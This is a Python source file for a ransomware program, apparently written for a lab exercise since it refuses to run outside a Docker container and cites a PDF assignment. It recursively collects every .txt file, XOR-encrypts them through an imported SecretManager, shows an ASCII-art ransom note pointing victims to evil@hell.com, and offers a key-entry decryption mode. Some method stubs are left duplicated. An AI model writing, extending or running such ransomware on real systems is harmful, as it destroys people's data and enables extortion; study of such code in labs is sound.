import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        raise NotImplemented()

    def encrypt(self):
        # main function for encrypting (see PDF)
        raise NotImplemented()

    def decrypt(self):
        # main function for decrypting (see PDF)
        raise NotImplemented()
    def get_files(self, filter:str)->list:
        # return all files matching the filter
        file_list = []
        for filepath in Path().rglob(filter):
            file_list.append(str(filepath.absolute()))
        
        return file_list
    
    def encrypt(self):
        # List all txt files
        txt_files = self.get_files("*.txt")

        # Create SecretManager
        secret_manager = SecretManager()

        # Call setup()
        secret_manager.setup()

        # Encrypt the files
        secret_manager.xorfiles(txt_files)

        # Display a message for the victim with the hex token
        hex_token = secret_manager.get_hex_token()
        print(f"Your files have been encrypted. To decrypt them, contact the attacker with the following token: {hex_token}")

    def decrypt(self):
        # Load the cryptographic elements and the list of encrypted files
        secret_manager = SecretManager()
        secret_manager.load()
        encrypted_files = self.get_files("*.txt")

        while True:
            try:
                # Ask for the key
                b64_key = input("Enter the decryption key (base64): ")

                # Call set_key, xorfiles, clean, and display a message
                secret_manager.set_key(b64_key)
                secret_manager.xorfiles(encrypted_files)
                secret_manager.clean()
                print("Your files have been successfully decrypted.")
                break
            except ValueError:
                # Display an error message and try again
                print("The provided key is incorrect. Please try again.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()

        from pathlib import Path


